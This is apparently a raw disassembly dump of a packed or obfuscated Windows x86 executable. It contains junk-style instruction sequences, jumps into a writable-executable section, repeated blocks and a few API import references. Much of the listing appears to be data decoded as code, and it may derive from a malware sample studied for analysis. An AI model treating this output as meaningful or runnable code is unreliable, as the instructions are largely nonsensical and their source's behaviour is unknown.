mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_5168f2
xor ebx ebx
sub esp 0xfffffffc
ja rwxdata
jmp rwxdata
push edx
stc
shr eax 0x10
lea esp [ esp + 0x4 ]
pushad
test ebx ebx
stc
cmp [ esi ] 0x0
mov [ esp + 0x10 ] 0xa5145729
jmp rwxdata
shr eax 0x10
stc
stc
cmp [ esi ] 0x0
jl rwxdata
lea esp [ esp + 0x20 ]
je rwxdata
pushad
jmp rwxdata
je rwxdata
not bl
not cx
push esi
pushfd
mov ebx [ esp + 0x8 ]
mov [ esp + 0x4 ] bh
setns cl
mov ecx [ esp + 0xc ]
pushfd
call j_sub_4cfe36
seto bl
and ecx ecx
shr di cl
mov ecx [ esi + 0x4 ]
setne bh
test ch ch
rol bh cl
sub ecx 0x8
xadd di bx
movzx di bl
shr ecx 0x1
clc
bswap bx
jmp rwxdata
lea esp [ esp + 0x20 ]
je rwxdata
pushad
adc ch bh
setge ch
mov ecx [ esi + 0x4 ]
xadd di bx
shr di 0xe
btr di 0xe
bsr di cx
sub ecx 0x8
neg di
shr ecx 0x1
clc
movsx di bl
mov edi [ esi ]
not bx
pushad
add edi [ ebp - 0x4 ]
shl bl 0x7
or bl 0xbf
jmp rwxdata
jmp rwxdata
add cl 0xde
call sub_4ba5ea
shl bh 0x7
add esi 0x8
bsf bx si
bswap bx
xor bl 0x2c
mov bx [ esi ]
cmc
cmp ch 0xcd
shr ebx 0xc
stc
stc
cmp ebx 0x1
push ebp
jmp rwxdata
mov edi [ esi ]
bts bx cx
dec bl
bsr bx cx
add edi [ ebp - 0x4 ]
bsr bx ax
add esi 0x8
jmp rwxdata
mov [ esp + 0x8 ] ah
lea esp [ esp + 0x44 ]
je rwxdata
mov bx [ esi ]
bt dx ax
bt si 0x9
bt bp 0x3
pushad
shr ebx 0xc
stc
cmp ebx 0x1
call sub_515994
add [ eax ] al
inc edi
je rwxdata
cmp ax cx
setns bl
shrd bx si 0x8
push 0x5fb38d27
mov bx [ esi ]
pushfd
and ebx 0xfff
jmp rwxdata
stc
push 0x36eb56d9
stc
cmp ebx 0x2
push 0xf84f98d
pushad
lea esp [ esp + 0x28 ]
je rwxdata
call sub_5191a9
fcmove st5
pop eax
imul esi [ ebx + 0x6b ] 0x65657246
push ebx
jo rwxdata
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
cmp dh dh
shr bl cl
shl bx cl
mov bx [ esi ]
pushfd
and ebx 0xfff
call sub_514f4a
add [ eax ] al
dec ebp
outsd
jne rwxdata
cmc
cmc
cmp ebx 0x3
pushad
call sub_4cd011
lea esp [ esp + 0x24 ]
jae rwxdata
add [ eax - 0x58 ] ch
adc al al
jle __import_name_0(KERNEL32:GetCurrentProcess)
jle rwxdata
mov esp 0x4601781d
cmp al 0x69
mov [ 0xffffffffe9ef6996 ] ch
lodsb [ si ]
cmpsd [ esi ] [ edi ]
arpl [ ebp + 0x45 ] sp
js rwxdata
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
mov ebx 0xafc2bff4
ror [ esi - 0x62305f19 ] cl
0x34ffda84 0x8524
[ eax + 0x2c24648d ]
xor esi [ gs : edx ]
dec esi
js rwxdata
jmp rwxdata
jmp rwxdata
inc edi
je rwxdata
in al dx
outsd
bswap esi
lahf
cmp al 0x0
add dl bl
int 0x58
mov edi 0x6bd472f
in al 0x62
mov dl 0x70
sti
insb
imul [ edx + 0x7c5df96f ]
mov al 0x27
mov ecx 0x319e2d58
mov eax [ 0xffffffffbc36a200 ]
sbb eax 0x3c460178
imul ecx [ eax - 0x109669d3 ] 0xa7ac67e9
push 0x9447f669
mov ebp 0xd6af0e06
pushfd
cmp [ edi ] eax
add [ ebp - 0x185c2d04 ] ecx
cmpsb [ es : esi ] [ edi ]
sar [ ebp - 0x536ddcb0 ] cl
je rwxdata
add [ ebx - 0x54f099c2 ] cl

pushad
jmp rwxdata
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
bswap si
ror si cl
btr si bx
sbb esi esi
add edi ebx
sar esi 0x1f
mov esi [ edx ]
cmp ch dh
pushfd
test esi esi
pushad
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
xor al 0x24
test edi edi
pushfd
pushad
lea esp [ esp + 0x2c ]
add ah al
jbe rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jb rwxdata
xchg esi eax
imul ebp edi 0xa7ac67e9
jne rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata
call sub_516af7
adc si dx
clc
stc
add esi ebx
push 0x116783e1
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
jne rwxdata
insb
les edi [ ebx - 0x32 ]
push esi
iretd
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
call j_sub_5156a9
add [ eax ] al
inc edx
imul esi [ edx + eax * 2 + 0x6c ] 0xe9600074
aad 0xf8
jne rwxdata
cli
stc
dec edi
loopne rwxdata
jb rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
pushad
jmp rwxdata
jpe rwxdata
pushfd
stosb [ edi ]
mov [ esp ] 0x54f5
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
push cs
scasd [ edi ]
salc
sbb dl bh
sub al 0xd3
xchg esp eax
movsd [ edi ] [ esi ]
adc bl [ edi - 0x12 ]
pushfd
mov ebx 0x66909afa
xchg ecx eax
test al 0x38
xchg esi eax
cld
cdq
fsubr st5
outsd
dec eax
mov [ 0xffffffffd2a626e7 ] eax
mov ebp 0xac922350
outsb
je rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pushfd
jmp rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
cmp [ edx + 0x26 ] dh
mov edi 0x68ab77ca
cli
jb rwxdata
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
lea esp [ esp + 0x24 ]
jne rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
salc
arpl [ ebp + 0x73 ] sp
jae rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
push 0x7ec010a8
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jmp rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
